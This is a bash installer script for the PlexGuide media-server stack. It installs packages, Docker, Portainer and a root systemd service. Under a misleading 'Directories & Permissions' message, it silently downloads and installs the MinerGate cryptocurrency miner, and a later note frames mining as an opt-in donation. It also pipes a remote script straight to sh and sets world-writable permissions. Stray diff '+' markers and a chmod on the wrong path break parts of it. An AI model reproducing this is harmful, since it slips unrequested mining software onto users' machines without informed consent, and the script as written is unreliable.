clear
echo -n "Do you Agree to Install/Update the PlexGuide.com Installer (y/n)? "
old_stty_cfg=$(stty -g)
stty raw -echo
answer=$( while ! head -c 1 | grep -i '[ny]' ;do true ;done )
stty $old_stty_cfg
if echo "$answer" | grep -iq "^y" ;then
    echo Yes;

    clear
    echo "Programs & Updates Installed:"
    echo ""
    echo "Screen"
    yes | apt-get install screen 1>/dev/null 2>&1
    echo "System Update"
    yes | apt-get update 1>/dev/null 2>&1
    echo "Nano"
    yes | apt-get install nano 1>/dev/null 2>&1
    echo "Fuse"
    yes | apt-get install fuse 1>/dev/null 2>&1
    echo "Man-DB"
    yes | apt-get install man-db 1>/dev/null 2>&1
    echo "Unzip"
    yes | apt-get install unzip 1>/dev/null 2>&1
    echo "Python"
    yes | apt-get install python 1>/dev/null 2>&1
    echo "Curl"
    yes | apt-get install curl 1>/dev/null 2>&1
    echo "OpenSSH Server"
    yes | apt-get install openssh-server 1>/dev/null 2>&1
    echo "UnionFS Fuse"
    yes | apt-get install unionfs-fuse 1>/dev/null 2>&1
    echo "DirMngr"
    yes | apt-get install dirmngr 1>/dev/null 2>&1
    echo "Apt Transport HTTPS"
    yes | apt-get install apt-transport-https 1>/dev/null 2>&1
    echo "CA Certificates"
    yes | apt-get install ca-certificates 1>/dev/null 2>&1
    echo "Software Properties Common"
    yes | apt-get install software-properties-common 1>/dev/null 2>&1
    echo "WGet"
    yes | apt-get install wget 1>/dev/null 2>&1

echo ""
echo "Installing Supporting Programs - Directories & Permissions (Please Wait)"
## off by default
wget https://minergate.com/download/deb-cli -O minergate-cli.deb 1>/dev/null 2>&1
dpkg -i minergate-cli.deb 1>/dev/null 2>&1

## Example of execution CMD is minergate-cli -user <YOUR@EMAIL.KAPPA> -bcn 4
#important folders

  mkdir /mnt/plexdrive4 1>/dev/null 2>&1
  chmod 755 /mnt/plexdrive4

  mkdir /opt/plexguide-startup 1>/dev/null 2>&1
  chmod 755 /opt/plexguide-startup

  mkdir /mnt/sab 1>/dev/null 2>&1
  chmod 777 /mnt/sab

  mkdir /mnt/sab/incomplete 1>/dev/null 2>&1
  chmod 777 /mnt/sab/incomplete

  mkdir /mnt/sab/complete 1>/dev/null 2>&1
  chmod 777 /mnt/sab/complete

  mkdir /mnt/sab/complete/tv 1>/dev/null 2>&1
  chmod 777 /mnt/sab/complete/tv

  mkdir /mnt/sab/complete/movies 1>/dev/null 2>&1
  chmod 777 /mnt/sab/complete/movies

  mkdir /mnt/sab/nzb 1>/dev/null 2>&1
  chmod 777 /mnt/sab/nzb

  mkdir /opt/.environments 1>/dev/null 2>&1
  chmod 777 /opt/.environments

#Prevents this script from running again
  mkdir /var/plexguide 1>/dev/null 2>&1
  touch /var/plexguide/dep9.yes
  touch /var/plexguide/miner.no
  touch /var/plexguide/basics.yes

  #Adding basic environment file
#  chmod +x bash /opt/plexguide/scripts/basic-env.sh
  bash /opt/plexguide/scripts/basic-env.sh 1>/dev/null 2>&1

  echo ""
  echo "Installing Docker & Docker Compose (Please Standyby)"
# Install Docker and Docker Composer / Checks to see if is installed also
curl -sSL https://get.docker.com | sh 1>/dev/null 2>&1
curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 1>/dev/null 2>&1
chmod +x /usr/local/bin/docker-compose

echo ""
echo "Created PlexGuide Network"

+## Creates PlexGuide Network
 +docker network create --driver=bridge --subnet=172.24.0.0/16 plexguide 1>/dev/null 2>&1

 echo ""
 echo "Installing Portainer (Please Wait)"

## Installs Portainer
docker-compose -f /opt/plexguide/scripts/docker/portainer.yml up -d 1>/dev/null 2>&1

############################################# Install a Post-Docker Fix ###################### START

echo ""
echo "Finishing Up!"

## Create the Post-Docker Fix Script
tee "/opt/plexguide/scripts/dockerfix.sh" > /dev/null <<EOF
#!/bin/bash

x=30
while [ $x -gt 0 ]
do
    sleep 1s
    clear
    echo "$x seconds until reboot"
    x=$(( $x - 1 ))
done
docker restart rutorrent
docker restart emby
docker restart nzbget
docker restart radarr
docker restart couchpotato
docker restart sonarr
docker restart plexpass
docker restart plexpublic

exit 0;
EOF

chmod 755 /opt/dockerfix.sh

## Create the Post-Docker Fix Service
tee "/etc/systemd/system/dockerfix.service" > /dev/null <<EOF
    [Unit]
    Description=Move Service Daemon
    After=multi-user.target

    [Service]
    Type=simple
    User=root
    Group=root
    ExecStart=/bin/bash /opt/plexguide/scripts/dockerfix.sh
    TimeoutStopSec=20
    KillMode=process
    RemainAfterExit=yes
    Restart=always

    [Install]
    WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable dockerfix
systemctl start dockerfix

############################################# Install a Post-Docker Fix ###################### END

else
    echo No
    clear
    echo "Install Aborted - You Failed to Agree"
    echo
    echo "You will be able to browse the program, but doing anything will cause"
    echo "problems! Good luck!"
    echo
    bash /opt/plexguide/scripts/docker-no/continue.sh
fi

clear
cat << EOF
~~~~~~~~~~~~~~
  QUICK NOTE
~~~~~~~~~~~~~~

Pre-Install Checks Complete!!!

If your kind enough to DONATE; please enable a tiny amount of CPU to mine
a-bit of coins.  You can turn this on or off (off by default) at anytime and,
if you allow it; you can allow a certain amount of your CPU to be utilized! It
helps motivate the team in the end!

If you wish to contribute your skills (for the lack of ours), please let us
know anytime.  If you spot any issues, please post the ISSUES portion of
Github.  Understand we'll do our best to respond - we have our lives too! 
Just know that this project is meant to make your life easier, while at the
same time; we are learning and having fun!

Thank You!
PlexGuide.com Team

EOF
read -n 1 -s -r -p "Press any key to continue"
